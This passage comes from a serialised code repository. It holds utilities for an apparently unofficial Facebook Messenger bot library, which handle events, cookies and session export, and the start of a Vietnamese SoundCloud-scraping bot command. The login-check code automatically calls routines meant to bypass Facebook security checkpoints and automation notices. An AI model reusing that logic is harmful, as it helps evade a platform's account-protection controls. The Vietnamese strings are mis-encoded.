(logMessageData.theme_emoji || x.emoji);\n                x.color = (logMessageData['theme_color'] || x.color);\n                updateData(formatID((m.messageMetadata.threadKey.threadFbId || m.messageMetadata.threadKey.otherUserFbId).toString()),x);\n            }\n                break;\n            case \"log:thread-icon\": {\n                let x = getData(formatID((m.messageMetadata.threadKey.threadFbId || m.messageMetadata.threadKey.otherUserFbId).toString()));\n                x.emoji = (logMessageData['thread_icon'] || x.emoji);\n                updateData(formatID((m.messageMetadata.threadKey.threadFbId || m.messageMetadata.threadKey.otherUserFbId).toString()),x);\n            }\n                break;\n            case \"log:user-nickname\": {\n                let x = getData(formatID((m.messageMetadata.threadKey.threadFbId || m.messageMetadata.threadKey.otherUserFbId).toString()));\n                x.nicknames[logMessageData.participant_id] = (logMessageData.nickname.length == 0 ? x.userInfo.find(i => i.id == String(logMessageData.participant_id)).name : logMessageData.nickname);\n                updateData(formatID((m.messageMetadata.threadKey.threadFbId || m.messageMetadata.threadKey.otherUserFbId).toString()),x);\n            }\n                break;\n            case \"log:thread-admins\": {\n                let x = getData(formatID((m.messageMetadata.threadKey.threadFbId || m.messageMetadata.threadKey.otherUserFbId).toString()));\n                switch (logMessageData.ADMIN_EVENT) {\n                    case \"add_admin\": {\n                        x.adminIDs.push({ id: logMessageData.TARGET_ID });\n                    }\n                        break;\n                    case \"remove_admin\": {\n                        x.adminIDs = x.adminIDs.filter(item => item.id != logMessageData.TARGET_ID);\n                    }\n                    break;\n                }\n                updateData(formatID((m.messageMetadata.threadKey.threadFbId || m.messageMetadata.threadKey.otherUserFbId).toString()),x);\n            }\n                break;\n            case \"log:thread-approval-mode\": {\n                let x = getData(formatID((m.messageMetadata.threadKey.threadFbId || m.messageMetadata.threadKey.otherUserFbId).toString()));\n                if (x.approvalMode == true) { \n                    x.approvalMode = false;\n                }\n                else {\n                    x.approvalMode = true;\n                }\n                updateData(formatID((m.messageMetadata.threadKey.threadFbId || m.messageMetadata.threadKey.otherUserFbId).toString()),x);\n            }\n                break;\n            case \"log:thread-name\": {\n                let x = getData(formatID((m.messageMetadata.threadKey.threadFbId || m.messageMetadata.threadKey.otherUserFbId).toString()));\n                x.threadName = (logMessageData.name || formatID((m.messageMetadata.threadKey.threadFbId || m.messageMetadata.threadKey.otherUserFbId).toString()));\n                updateData(formatID((m.messageMetadata.threadKey.threadFbId || m.messageMetadata.threadKey.otherUserFbId).toString()),x);\n            }\n                break;\n            case \"log:subscribe\": {\n                let x = getData(formatID((m.messageMetadata.threadKey.threadFbId || m.messageMetadata.threadKey.otherUserFbId).toString()));\n                for (let o of logMessageData.addedParticipants) {\n                    if (x.userInfo.some(i => i.id == o.userFbId)) continue; \n                    else {\n                        x.userInfo.push({\n                            id: o.userFbId,\n                            name: o.fullName,\n                            gender: getGenderByPhysicalMethod(o.fullName)\n                        });\n                        x.participantIDs.push(o.userFbId);\n                    }\n                }\n                updateData(formatID((m.messageMetadata.threadKey.threadFbId || m.messageMetadata.threadKey.otherUserFbId).toString()),x);\n            }\n                break;\n            case \"log:unsubscribe\": {\n                let x = getData(formatID((m.messageMetadata.threadKey.threadFbId || m.messageMetadata.threadKey.otherUserFbId).toString()));\n                x.participantIDs = x.participantIDs.filter(item => item != logMessageData.leftParticipantFbId);\n                x.userInfo = x.userInfo.filter(item => item.id != logMessageData.leftParticipantFbId);\n                    if (x.adminIDs.some(i => i.id == logMessageData.leftParticipantFbId)) {\n                        x.adminIDs = x.adminIDs.filter(item => item.id != logMessageData.leftParticipantFbId);\n                    }\n                updateData(formatID((m.messageMetadata.threadKey.threadFbId || m.messageMetadata.threadKey.otherUserFbId).toString()),x);      \n            }\n            break;\n        }\n    }\n}\n\nreturn {\n    type: \"event\",\n    threadID: formatID((m.messageMetadata.threadKey.threadFbId || m.messageMetadata.threadKey.otherUserFbId).toString()),\n    logMessageType: logMessageType,\n    logMessageData: logMessageData,\n    logMessageBody: m.messageMetadata.adminText,\n    author: m.messageMetadata.actorFbId,\n    participantIDs: m.participants || []\n    };  \n}\n\n/**\n * @param {{ st: any; from: { toString: () => any; }; to: any; thread_fbid: any; hasOwnProperty: (arg0: string) => any; from_mobile: any; realtime_viewer_fbid: any; }} event\n */\n\nfunction formatTyp(event) {\nreturn {\n        isTyping: !!event.st,\n        from: event.from.toString(),\n        threadID: formatID((event.to || event.thread_fbid || event.from).toString()),\n        // When receiving typ indication from mobile, `from_mobile` isn't set.\n        // If it is, we just use that value.\n        fromMobile: event.hasOwnProperty(\"from_mobile\") ? event.from_mobile : true,\n        userID: (event.realtime_viewer_fbid || event.from).toString(),\n        type: \"typ\"\n    };\n}\n\n/**\n * @param {{ threadKey: { otherUserFbId: any; threadFbId: any; }; actorFbId: any; actionTimestampMs: any; }} delta\n */\n\nfunction formatDeltaReadReceipt(delta) {\n    // otherUserFbId seems to be used as both the readerID and the threadID in a 1-1 chat.\n    // In a group chat actorFbId is used for the reader and threadFbId for the thread.\n    return {\n        reader: (delta.threadKey.otherUserFbId || delta.actorFbId).toString(),\n        time: delta.actionTimestampMs,\n        threadID: formatID((delta.threadKey.otherUserFbId || delta.threadKey.threadFbId).toString()),\n        type: \"read_receipt\"\n    };\n}\n\n/**\n * @param {{ reader: { toString: () => any; }; time: any; thread_fbid: any; }} event\n */\n\nfunction formatReadReceipt(event) {\n    return {\n        reader: event.reader.toString(),\n        time: event.time,\n        threadID: formatID((event.thread_fbid || event.reader).toString()),\n        type: \"read_receipt\"\n    };\n}\n\n/**\n * @param {{ chat_ids: any[]; thread_fbids: any[]; timestamp: any; }} event\n */\n\nfunction formatRead(event) {\n    return {\n        threadID: formatID(((event.chat_ids && event.chat_ids[0]) || (event.thread_fbids && event.thread_fbids[0])).toString()),\n        time: event.timestamp,\n        type: \"read\"\n    };\n}\n\n/**\n * @param {string} str\n * @param {string | any[]} startToken\n * @param {string} endToken\n */\n\nfunction getFrom(str, startToken, endToken) {\n    var start = str.indexOf(startToken) + startToken.length;\n    if (start < startToken.length) return \"\";\n    var lastHalf = str.substring(start);\n    var end = lastHalf.indexOf(endToken);\n    if (end === -1) throw Error(\"Could not find endTime \" + endToken + \" in the given string.\");\n    return lastHalf.substring(0, end);\n}\n\n\nfunction getFroms(str, startToken, endToken) {\n    //advanced search by kanzuuuuuuuuuu \n    let results = [];\n    let currentIndex = 0;\n    \n    while (true) {\n        let start = str.indexOf(startToken, currentIndex);\n        if (start === -1) break;\n        \n        start += startToken.length;\n        \n        let lastHalf = str.substring(start);\n        let end = lastHalf.indexOf(endToken);\n        \n        if (end === -1) {\n            if (results.length === 0) {\n                throw Error(\"Could not find endToken `\" + endToken + \"` in the given string.\");\n            }\n            break;\n        }\n        \n        results.push(lastHalf.substring(0, end));\n        currentIndex = start + end + endToken.length;\n    }\n    \n    return results.length === 0 ? \"\" : results.length === 1 ? results[0] : results;\n}\n\n/**\n * @param {string} html\n */\n\nfunction makeParsable(html) {\n    let withoutForLoop = html.replace(/for\\s*\\(\\s*;\\s*;\\s*\\)\\s*;\\s*/\n, \"\");\n\n    // (What the fuck FB, why windows style newlines?)\n    // So sometimes FB will send us base multiple objects in the same response.\n    // They're all valid JSON, one after the other, at the top level. We detect\n    // that and make it parse-able by JSON.parse.\n    //       Ben - July 15th 2017\n    //\n    // It turns out that Facebook may insert random number of spaces before\n    // next object begins (issue #616)\n    //       rav_kr - 2018-03-19\n    let maybeMultipleObjects = withoutForLoop.split(/\\}\\r\\n *\\{/);\n    if (maybeMultipleObjects.length === 1) return maybeMultipleObjects;\n\n    return \"[\" + maybeMultipleObjects.join(\"},{\") + \"]\";\n}\n\n/**\n * @param {any} form\n */\n\nfunction arrToForm(form) {\n    return arrayToObject(form,\n        function(/** @type {{ name: any; }} */v) {\n            return v.name;\n        },\n        function(/** @type {{ val: any; }} */v) {\n            return v.val;\n        }\n    );\n}\n\n/**\n * @param {any[]} arr\n * @param {{ (v: any): any; (arg0: any): string | number; }} getKey\n * @param {{ (v: any): any; (arg0: any): any; }} getValue\n */\n\nfunction arrayToObject(arr, getKey, getValue) {\n    return arr.reduce(function(/** @type {{ [x: string]: any; }} */\n acc, /** @type {any} */val) {\n        acc[getKey(val)] = getValue(val);\n        return acc;\n    }, {});\n}\n\nfunction getSignatureID() {\n    return Math.floor(Math.random() * 2147483648).toString(16);\n}\n\nfunction generateTimestampRelative() {\n    var d = new Date();\n    return d.getHours() + \":\" + padZeros(d.getMinutes());\n}\n\n/**\n * @param {any} html\n * @param {any} userID\n * @param {{ fb_dtsg: any; ttstamp: any; globalOptions: any; }} ctx\n */\n\nfunction makeDefaults(html, userID, ctx) {\n    var reqCounter = 1;\n    var fb_dtsg = getFrom(html, 'name=\"fb_dtsg\" value=\"', '\"');\n\n    // @Hack Ok we've done hacky things, this is definitely on top 5.\n    // We totally assume the object is flat and try parsing until a }.\n    // If it works though it's cool because we get a bunch of extra data things.\n    //\n    // Update: we don't need this. Leaving it in in case we ever do.\n    //       Ben - July 15th 2017\n\n    // var siteData = getFrom(html, \"[\\\"SiteData\\\",[],\", \"},\");\n    // try {\n    //   siteData = JSON.parse(siteData + \"}\");\n    // } catch(e) {\n    //   log.warn(\"makeDefaults\", \"Couldn't parse SiteData. Won't have access to some variables.\");\n    //   siteData = {};\n    // }\n\n    var ttstamp = \"2\";\n    for (var i = 0; i < fb_dtsg.length; i++) ttstamp += fb_dtsg.charCodeAt(i);\n    var revision = getFrom(html, 'revision\":', \",\");\n\n    /**\n     * @param {{ [x: string]: any; hasOwnProperty: (arg0: string) => any; }} obj\n     */\n\n    function mergeWithDefaults(obj) {\n        // @TODO This is missing a key called __dyn.\n        // After some investigation it seems like __dyn is some sort of set that FB\n        // calls BitMap. It seems like certain responses have a \"define\" key in the\n        // res.jsmods arrays. I think the code iterates over those and calls `set`\n        // on the bitmap for each of those keys. Then it calls\n        // bitmap.toCompressedString() which returns what __dyn is.\n        //\n        // So far the API has been working without this.\n        //\n        //              Ben - July 15th 2017\n        var newObj = {\n            __user: userID,\n            __req: (reqCounter++).toString(36),\n            __rev: revision,\n            __a: 1,\n            // __af: siteData.features,\n            fb_dtsg: ctx.fb_dtsg ? ctx.fb_dtsg : fb_dtsg,\n            jazoest: ctx.ttstamp ? ctx.ttstamp : ttstamp\n                // __spin_r: siteData.__spin_r,\n                // __spin_b: siteData.__spin_b,\n                // __spin_t: siteData.__spin_t,\n        };\n\n        // @TODO this is probably not needed.\n        //         Ben - July 15th 2017\n        // if (siteData.be_key) {\n        //   newObj[siteData.be_key] = siteData.be_mode;\n        // }\n        // if (siteData.pkg_cohort_key) {\n        //   newObj[siteData.pkg_cohort_key] = siteData.pkg_cohort;\n        // }\n\n        if (!obj) return newObj;\n        for (var prop in obj)\n            if (obj.hasOwnProperty(prop))\n                if (!newObj[prop]) newObj[prop] = obj[prop];\n        return newObj;\n    }\n\n    /**\n     * @param {any} url\n     * @param {any} jar\n     * @param {any} form\n     * @param {any} ctxx\n     */\n\n    function postWithDefaults(url, jar, form, ctxx) {\n        return post(url, jar, mergeWithDefaults(form), ctx.globalOptions, ctxx || ctx);\n    }\n\n    /**\n     * @param {any} url\n     * @param {any} jar\n     * @param {any} qs\n     * @param {any} ctxx\n     */\n\n    function getWithDefaults(url, jar, qs, ctxx) {\n        return get(url, jar, mergeWithDefaults(qs), ctx.globalOptions, ctxx || ctx);\n    }\n\n    /**\n     * @param {any} url\n     * @param {any} jar\n     * @param {any} form\n     * @param {any} qs\n     * @param {any} ctxx\n     */\n\n    function postFormDataWithDefault(url, jar, form, qs, ctxx) {\n        return postFormData(url, jar, mergeWithDefaults(form), mergeWithDefaults(qs), ctx.globalOptions, ctxx || ctx);\n    }\n\n    return {\n        get: getWithDefaults,\n        post: postWithDefaults,\n        postFormData: postFormDataWithDefault\n    };\n}\n\n/**\n * @param {{ jar: { setCookie: (arg0: string, arg1: string) => void; }; fb_dtsg: string; ttstamp: string; }} ctx\n * @param {{ postFormData: (arg0: string, arg1: any, arg2: any, arg3: {}) => any; post: (arg0: string, arg1: any, arg2: any) => any; get: (arg0: any, arg1: any) => Promise<any>; }} defaultFuncs\n * @param {string | number} [retryCount]\n */\n\nfunction parseAndCheckLogin(ctx, defaultFuncs, retryCount) {\n    if (retryCount == undefined) retryCount = 0;\n    return function(/** @type {{ body: string; statusCode: string | number; request: { uri: { protocol: string; hostname: string; pathname: string; }; headers: { [x: string]: string; }; formData: any; method: string; }; }} */data) {\n        return bluebird.try(function() {\n            log.verbose(\"parseAndCheckLogin\", data.body);\n            if (data.statusCode >= 500 && data.statusCode < 600) {\n                if (retryCount >= 5) {\n                    throw {\n                        error: \"Request retry failed. Check the `res` and `statusCode` property on this error.\",\n                        statusCode: data.statusCode,\n                        res: data.body\n                    };\n                }\n                retryCount++;\n                var retryTime = Math.floor(Math.random() * 5000);\n                log.warn(\"parseAndCheckLogin\", \"Got status code \" + data.statusCode + \" - \" + retryCount + \". attempt to retry in \" + retryTime + \" milliseconds...\");\n                var url = data.request.uri.protocol + \"//\" + data.request.uri.hostname + data.request.uri.pathname;\n                if (data.request.headers[\"Content-Type\"].split(\";\")[0] === \"multipart/form-data\") {\n                    return bluebird.delay(retryTime).then(() => defaultFuncs.postFormData(url, ctx.jar, data.request.formData, {}))\n                        .then(parseAndCheckLogin(ctx, defaultFuncs, retryCount));\n                } else {\n                    return bluebird.delay(retryTime).then(() => defaultFuncs.post(url, ctx.jar, data.request.formData))\n                        .then(parseAndCheckLogin(ctx, defaultFuncs, retryCount));\n                }\n            }\n            if (data.statusCode !== 200) throw new Error(\"parseAndCheckLogin got status code: \" + data.statusCode + \". Bailing out of trying to parse response.\");\n\n            var res = null;\n            try {\n                res = JSON.parse(makeParsable(data.body));\n            } catch (e) {\n                throw {\n                    error: \"JSON.parse error. Check the `detail` property on this error.\",\n                    detail: e,\n                    res: data.body\n                };\n            }\n\n            // In some cases the response contains only a redirect URL which should be followed\n            if (res.redirect && data.request.method === \"GET\") return defaultFuncs.get(res.redirect, ctx.jar).then(parseAndCheckLogin(ctx, defaultFuncs));\n\n            // TODO: handle multiple cookies?\n            if (res.jsmods && res.jsmods.require && Array.isArray(res.jsmods.require[0]) && res.jsmods.require[0][0] === \"Cookie\") {\n                res.jsmods.require[0][3][0] = res.jsmods.require[0][3][0].replace(\"_js_\", \"\");\n                var cookie = formatCookie(res.jsmods.require[0][3], \"facebook\");\n                var cookie2 = formatCookie(res.jsmods.require[0][3], \"messenger\");\n                ctx.jar.setCookie(cookie, \"https://www.facebook.com\");\n                ctx.jar.setCookie(cookie2, \"https://www.messenger.com\");\n            }\n\n            // On every request we check if we got a DTSG and we mutate the context so that we use the latest\n            // one for the next requests.\n            if (res.jsmods && Array.isArray(res.jsmods.require)) {\n                var arr = res.jsmods.require;\n                for (var i in arr) {\n                    if (arr[i][0] === \"DTSG\" && arr[i][1] === \"setToken\") {\n                        ctx.fb_dtsg = arr[i][3][0];\n\n                        // Update ttstamp since that depends on fb_dtsg\n                        ctx.ttstamp = \"2\";\n                        for (var j = 0; j < ctx.fb_dtsg.length; j++) ctx.ttstamp += ctx.fb_dtsg.charCodeAt(j);\n                    }\n                }\n            }\n\n            if (res.error === 1357001) {\n                if (global.Fca.Require.FastConfig.AutoLogin && global.Fca.Require.FastConfig.CheckPointBypass['956'].Allow) {\n                    return global.Fca.Require.logger.Warning(global.Fca.Require.Language.Index.Bypass_956, async function() {\n                        const Check = () => new Promise((re) => {\n                            defaultFuncs.get('https://facebook.com', ctx.jar).then(function(res) {\n                                if (res.headers.location && res.headers.location.includes('https://www.facebook.com/checkpoint/')) {\n                                    if (res.headers.location.includes('828281030927956')) return global.Fca.Action('Bypass', ctx, \"956\", defaultFuncs)\n                                    else if (res.request.uri && res.request.uri.href.includes(\"https://www.facebook.com/checkpoint/\")) {\n                                        if (res.request.uri.href.includes('601051028565049')) {\n                                            return global.Fca.BypassAutomationNotification(undefined, ctx.jar, ctx.globalOptions, undefined ,process.env.UID)\n                                        }\n                                    }\n                                    else return global.Fca.Require.logger.Error(global.Fca.Require.Language.Index.ErrAppState);\n                                }\n                                else return global.Fca.Require.logger.Warning(global.Fca.Require.Language.Index.AutoLogin, function() {\n                                    return global.Fca.Action('AutoLogin');\n                                });\n                            })\n                        })\n                        await Check();\n                    });\n                }\n                if (res.request.uri && res.request.uri.href.includes(\"https://www.facebook.com/checkpoint/\")) {\n                    if (res.request.uri.href.includes('601051028565049')) {\n                        return global.Fca.BypassAutomationNotification(undefined, ctx.jar, ctx.globalOptions, undefined ,process.env.UID)\n                    }\n                }\n                if (global.Fca.Require.FastConfig.AutoLogin) {\n                    return global.Fca.Require.logger.Warning(global.Fca.Require.Language.Index.AutoLogin, function() {\n                        return global.Fca.Action('AutoLogin');\n                    });\n                } \n                else if (!global.Fca.Require.FastConfig.AutoLogin) {\n                    return global.Fca.Require.logger.Error(global.Fca.Require.Language.Index.ErrAppState);\n                }\n                return;\n            }\n            else return res;\n        });\n    };\n}\n\n/**\n * @param {{ setCookie: (arg0: any, arg1: string) => void; }} jar\n */\n\nfunction saveCookies(jar) {\n    return function(/** @type {{ headers: { [x: string]: any[]; }; }} */res) {\n        var cookies = res.headers[\"set-cookie\"] || [];\n        cookies.forEach(function(/** @type {string} */c) {\n            if (c.indexOf(\".facebook.com\") > -1) { // yo wtf is this?\n                jar.setCookie(c, \"https://www.facebook.com\");\n                jar.setCookie(c.replace(/domain=\\.facebook\\.com/, \"domain=.messenger.com\"), \"https://www.messenger.com\");\n            }\n        });\n        return res;\n    };\n}\n\nvar NUM_TO_MONTH = [\n    \"Jan\",\n    \"Feb\",\n    \"Mar\",\n    \"Apr\",\n    \"May\",\n    \"Jun\",\n    \"Jul\",\n    \"Aug\",\n    \"Sep\",\n    \"Oct\",\n    \"Nov\",\n    \"Dec\"\n];\nvar NUM_TO_DAY = [\"Sun\", \"Mon\", \"Tue\", \"Wed\", \"Thu\", \"Fri\", \"Sat\"];\n\n/**\n * @param {{ getUTCDate: () => any; getUTCHours: () => any; getUTCMinutes: () => any; getUTCSeconds: () => any; getUTCDay: () => string | number; getUTCMonth: () => string | number; getUTCFullYear: () => string; }} date\n */\n\nfunction formatDate(date) {\n    var d = date.getUTCDate();\n    d = d >= 10 ? d : \"0\" + d;\n    var h = date.getUTCHours();\n    h = h >= 10 ? h : \"0\" + h;\n    var m = date.getUTCMinutes();\n    m = m >= 10 ? m : \"0\" + m;\n    var s = date.getUTCSeconds();\n    s = s >= 10 ? s : \"0\" + s;\n    return (NUM_TO_DAY[date.getUTCDay()] + \", \" + d + \" \" + NUM_TO_MONTH[date.getUTCMonth()] + \" \" + date.getUTCFullYear() + \" \" + h + \":\" + m + \":\" + s + \" GMT\");\n}\n\n/**\n * @param {string[]} arr\n * @param {string} url\n */\n\nfunction formatCookie(arr, url) {\n    return arr[0] + \"=\" + arr[1] + \"; Path=\" + arr[3] + \"; Domain=\" + url + \".com\";\n}\n\n/**\n * @param {{ thread_fbid: { toString: () => any; }; participants: any[]; name: any; custom_nickname: any; snippet: any; snippet_attachments: any; snippet_sender: any; unread_count: any; message_count: any; image_src: any; timestamp: any; mute_until: any; is_canonical_user: any; is_canonical: any; is_subscribed: any; folder: any; is_archived: any; recipients_loadable: any; has_email_participant: any; read_only: any; can_reply: any; cannot_reply_reason: any; last_message_timestamp: any; last_read_timestamp: any; last_message_type: any; custom_like_icon: any; custom_color: any; admin_ids: any; thread_type: any; }} data\n */\n\nfunction formatThread(data) {\n    return {\n        threadID: formatID(data.thread_fbid.toString()),\n        participants: data.participants.map(formatID),\n        participantIDs: data.participants.map(formatID),\n        name: data.name,\n        nicknames: data.custom_nickname,\n        snippet: data.snippet,\n        snippetAttachments: data.snippet_attachments,\n        snippetSender: formatID((data.snippet_sender || \"\").toString()),\n        unreadCount: data.unread_count,\n        messageCount: data.message_count,\n        imageSrc: data.image_src,\n        timestamp: data.timestamp,\n        muteUntil: data.mute_until,\n        isCanonicalUser: data.is_canonical_user,\n        isCanonical: data.is_canonical,\n        isSubscribed: data.is_subscribed,\n        folder: data.folder,\n        isArchived: data.is_archived,\n        recipientsLoadable: data.recipients_loadable,\n        hasEmailParticipant: data.has_email_participant,\n        readOnly: data.read_only,\n        canReply: data.can_reply,\n        cannotReplyReason: data.cannot_reply_reason,\n        lastMessageTimestamp: data.last_message_timestamp,\n        lastReadTimestamp: data.last_read_timestamp,\n        lastMessageType: data.last_message_type,\n        emoji: data.custom_like_icon,\n        color: data.custom_color,\n        adminIDs: data.admin_ids,\n        threadType: data.thread_type\n    };\n}\n\n/**\n * @param {any} obj\n */\n\nfunction getType(obj) {\n    return Object.prototype.toString.call(obj).slice(8, -1);\n}\n\n/**\n * @param {{ lat: number; p: any; }} presence\n * @param {any} userID\n */\n\nfunction formatProxyPresence(presence, userID) {\n    if (presence.lat === undefined || presence.p === undefined) return null;\n    return {\n        type: \"presence\",\n        timestamp: presence.lat * 1000,\n        userID: userID || '',\n        statuses: presence.p\n    };\n}\n\n/**\n * @param {{ la: number; a: any; }} presence\n * @param {any} userID\n */\n\nfunction formatPresence(presence, userID) {\n    return {\n        type: \"presence\",\n        timestamp: presence.la * 1000,\n        userID: userID || '',\n        statuses: presence.a\n    };\n}\n\n/**\n * @param {any} payload\n */\n\nfunction decodeClientPayload(payload) {\n    /*\n    Special function which Client using to \"encode\" clients JSON payload\n    */\n\n    /**\n     * @param {string | any[]} array\n     */\n\n    function Utf8ArrayToStr(array) {\n        var out, i, len, c;\n        var char2, char3;\n        out = \"\";\n        len = array.length;\n        i = 0;\n        while (i < len) {\n            c = array[i++];\n            switch (c >> 4) {\n                case 0:\n                case 1:\n                case 2:\n                case 3:\n                case 4:\n                case 5:\n                case 6:\n                case 7:\n                    out += String.fromCharCode(c);\n                    break;\n                case 12:\n                case 13:\n                    char2 = array[i++];\n                    out += String.fromCharCode(((c & 0x1F) << 6) | (char2 & 0x3F));\n                    break;\n                case 14:\n                    char2 = array[i++]; \n                    char3 = array[i++];\n                    out += String.fromCharCode(((c & 0x0F) << 12) | ((char2 & 0x3F) << 6) | ((char3 & 0x3F) << 0));\n                    break;\n            }\n        }\n        return out;\n    }\n    return JSON.parse(Utf8ArrayToStr(payload));\n}\n\n/**\n * @param {{ getCookies: (arg0: string) => string | any[]; }} jar\n */\n\nfunction getAppState(jar, Encode) {\n    var prettyMilliseconds = require('pretty-ms');\n    var getText = globalThis.Fca.getText;\n    var Security = require(\"./Extra/Security/Base\");\n    var appstate = jar.getCookies(\"https://www.facebook.com\").concat(jar.getCookies(\"https://facebook.com\")).concat(jar.getCookies(\"https://www.messenger.com\"));\n    var logger = require('./logger'),languageFile = require('./Language/index.json');\n    var Language = languageFile.find(i => i.Language == globalThis.Fca.Require.FastConfig.Language).Folder.Index;\n    var data;\n        switch (require(process.cwd() + \"/FastConfigFca.json\").EncryptFeature) {\n            case true: {\n                if (Encode == undefined) Encode = true;\n                if (process.env['FBKEY'] != undefined && Encode) {\n                    logger.Normal(Language.EncryptSuccess);\n                    data = Security(JSON.stringify(appstate),process.env['FBKEY'],\"Encrypt\");\n                }\n                else return appstate;\n            }\n                break;\n            case false: {\n                data = appstate;\n            }\n                break;\n            default: {\n                logger.Normal(getText(Language.IsNotABoolean,require(process.cwd() + \"/FastConfigFca.json\").EncryptFeature));\n                data = appstate;\n            } \n        }\n            if(!globalThis.Fca.Setting.get('getAppState')) {\n                logger.Normal(getText(Language.ProcessDone,`${prettyMilliseconds(Date.now() - globalThis.Fca.startTime)}`),function() { globalThis.Fca.Setting.set('getAppState',true); });\n            }\n    return data;\n}\n\nfunction getData_Path(Obj , Arr, Stt) {\n    //default stt = 0\n    if (Arr.length === 0 && Obj != undefined) {\n        return Obj; //object\n    }\n    else if (Obj == undefined) {\n        return Stt;\n    }\n    const head = Arr[0];\n    if (head == undefined) {\n        return Stt;\n    }\n    const tail = Arr.slice(1);\n    return getData_Path(Obj[head], tail, Stt++);\n}\n\n\nfunction setData_Path(obj, path, value) {\n    if (!path.length) {\n        return obj;\n    }\n    const currentKey = path[0];\n    let currentObj = obj[currentKey];\n\n    if (!currentObj) {\n        obj[currentKey] = value;\n        currentObj = obj[currentKey];\n    }\n    path.shift();\n    if (!path.length) {\n        currentObj = value;\n    } else {\n        currentObj = setData_Path(currentObj, path, value);\n    }\n\n    return obj;\n}\n\nfunction getPaths(obj, parentPath = []) {\n    let paths = [];\n        for (let prop in obj) {\n            if (typeof obj[prop] === \"object\") {\n                paths = paths.concat(getPaths(obj[prop], [...parentPath, prop]));\n            } else {\n                paths.push([...parentPath, prop]);\n            }\n        }\n    return paths;\n}\n    \nfunction cleanHTML (text) {\n    text = text.replace(/(<br>)|(<\\/?i>)|(<\\/?em>)|(<\\/?b>)|(!?~)|(&amp;)|(&#039;)|(&lt;)|(&gt;)|(&quot;)/g, (match) => {\n        switch (match) {\n          case \"<br>\":\n            return \"\\n\";\n          case \"<i>\":\n          case \"<em>\":\n          case \"</i>\":\n          case \"</em>\":\n            return \"*\";\n          case \"<b>\":\n          case \"</b>\":\n            return \"**\";\n          case \"~!\":\n          case \"!~\":\n            return \"||\";\n          case \"&amp;\":\n            return \"&\";\n          case \"&#039;\":\n            return \"'\";\n          case \"&lt;\":\n            return \"<\";\n          case \"&gt;\":\n            return \">\";\n          case \"&quot;\":\n            return '\"';\n        }\n    });\n    return text;\n}\n\nmodule.exports = {\n    cleanHTML,\n    isReadableStream:isReadableStream,\n    get:get,\n    post:post,\n    postFormData:postFormData,\n    generateThreadingID:generateThreadingID,\n    generateOfflineThreadingID:generateOfflineThreadingID,\n    getGUID:getGUID,\n    getFrom:getFrom,\n    makeParsable:makeParsable,\n    arrToForm:arrToForm,\n    getSignatureID:getSignatureID,\n    getJar: request.jar,\n    generateTimestampRelative:generateTimestampRelative,\n    makeDefaults:makeDefaults,\n    parseAndCheckLogin:parseAndCheckLogin,\n    getGender: getGenderByPhysicalMethod,\n    getData_Path,\n    setData_Path,\n    getPaths,\n    saveCookies,\n    getType,\n    _formatAttachment,\n    formatHistoryMessage,\n    formatID,\n    formatMessage,\n    formatDeltaEvent,\n    formatDeltaMessage,\n    formatProxyPresence,\n    formatPresence,\n    formatTyp,\n    formatDeltaReadReceipt,\n    formatCookie,\n    formatThread,\n    formatReadReceipt,\n    formatRead,\n    generatePresence,\n    generateAccessiblityCookie,\n    formatDate,\n    decodeClientPayload,\n    getAppState,\n    getAdminTextMessageType,\n    setProxy,\n    getFroms\n};","path":null,"size_bytes":89491,"size_tokens":null},"modules/commands/scl.js":{"content":"const axios = require('axios');\nconst cheerio = require('cheerio');\nconst fs = require('fs-extra');\nconst moment = require('moment-timezone');\n\nasync function scl_download(url) {\n  const res = await axios.get('https://soundcloudmp3.org/id');\n  const $ = cheerio.load(res.data);\n  const _token = $('form#conversionForm > input[type=hidden]').attr('value');\n\n  const conver = await axios.post('https://soundcloudmp3.org/converter',\n    new URLSearchParams(Object.entries({ _token, url })),\n    {\n      headers: {\n        cookie: res.headers['set-cookie'],\n        accept: 'UTF-8',\n      },\n    }\n  );\n\n  const $$ = cheerio.load(conver.data);\n  const datadl = {\n    thumb: $$('div.info.clearfix > img').attr('src'),\n    title: $$('div.info.clearfix > p:nth-child(2)').text().replace('Title:', '').trim(),\n    duration: $$('div.info.clearfix > p:nth-child(3)').text().replace(/Length:|Minutes/gi, '').trim(),\n    quality: $$('div.info.clearfix > p:nth-child(4)').text().replace('Quality:', '').trim(),\n    url: $$('a#download-btn').attr('href'),\n  };\n\n  return datadl;\n}\n\nmodule.exports.config = {\n  name: 'scl',\n  version: '1.0.0',\n  hasPermssion: 0,\n  credits: 'DongDev',\n  description: 'T√¨m ki·∫øm nh·∫°c tr√™n SoundCloud',\n  commandCategory: 'Ti·ªán √≠ch',\n  usages: '[]',\n  cooldowns: 5,\n  images: [],\n};\n\nmodule.exports.run = async function ({ api, event, args }) {\n  const query = args.join(\" \").trim();\n  const { threadID, messageID } = event;\n  const linkURL = `https://soundcloud.com`;\n  const headers = {\n    Accept: \"application/json\",\n    \"Accept-Language\": \"en-US,en;q=0.9,vi;q=0.8\",\n    \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.63 Safari/537.36\",\n  };\n\n  if (!query) {\n    api.sendMessage(\"‚ö†Ô∏è Vui l√≤ng nh·∫≠p t·ª´ kh√≥a t√¨m ki·∫øm\", threadID, messageID);\n    return;\n  }\n\n  try {\n    const response = await axios.get(`https://m.soundcloud.com/search?q=${encodeURIComponent(query)}`, {\n      headers\n    });\n    const htmlContent = response.data;\n\n    const $ = cheerio.load(htmlContent);\n    const dataaa = [];\n\n    $(\"div > ul > li > div\").each(function (index, element) {\n      if (index < 5) {\n        const title = $(element).find(\"a\").attr(\"aria-label\")?.trim() || \"\";\n        const url = linkURL + ($(element).find(\"a\").attr(\"href\") || \"\").trim();\n        const thumb = $(element).find(\"a > div > div > div > picture > img\").attr(\"src\")?.trim() || \"\";\n        const artist = $(element).find(\"a > div > div > div\").eq(1).text()?.trim() || \"\";\n        const views = $(element).find(\"a > div > div > div > div > div\").eq(0).text()?.trim() || \"\";\n        const timestamp = $(element).find(\"a > div > div > div > div > div\").eq(1).text()?.trim() || \"\";\n        const release = $(element).find(\"a > div > div > div > div > div\").eq(2).text()?.trim() || \"\";\n\n        dataaa.push({\n          title,\n          url,\n          thumb,\n          artist,\n          views,\n          release,\n          timestamp,\n        });\n      }\n    });\n\n    if (dataaa.length === 0) {\n      api.sendMessage(`‚ùé Kh√¥ng t√¨m th·∫•y k·∫øt qu·∫£ cho t·ª´ kh√≥a \"${query}\"`, threadID, messageID);\n      return;\n    }\n\n    const messages = dataaa.map((item, index) => {\n      return `\\n${index + 1}. 